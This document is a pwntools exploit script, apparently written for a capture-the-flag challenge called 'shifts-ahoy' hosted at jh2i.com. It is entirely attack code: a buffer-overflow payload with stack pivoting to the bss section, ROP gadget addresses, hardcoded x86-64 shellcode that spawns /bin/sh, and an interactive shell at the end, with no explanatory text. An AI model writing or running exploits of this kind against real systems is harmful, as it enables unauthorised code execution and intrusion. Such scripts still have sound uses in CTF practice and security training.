from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './shifts-ahoy'
HOST = 'jh2i.com'
PORT = 50015

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

_64_SHELLCODE = "\x6a\x3b\x58\x48\x99\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x57\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"
bss = 0x404120
rdi = 0x00401413
rsi_p1 = 0x00401411
re_read = 0x401268

r = start()
if args.D:
    debug(r, [0x12e5])

r.sendlineafter('> ', '1')

payload = ''
payload += 'A'*72
payload += flat(0xc0bebeef, bss+0x50, re_read)
payload += _64_SHELLCODE
payload += 'A'*4
payload += 'B'*0x38
payload += p64(bss+1)
r.sendlineafter('message: ', payload)


r.interactive()
r.close()
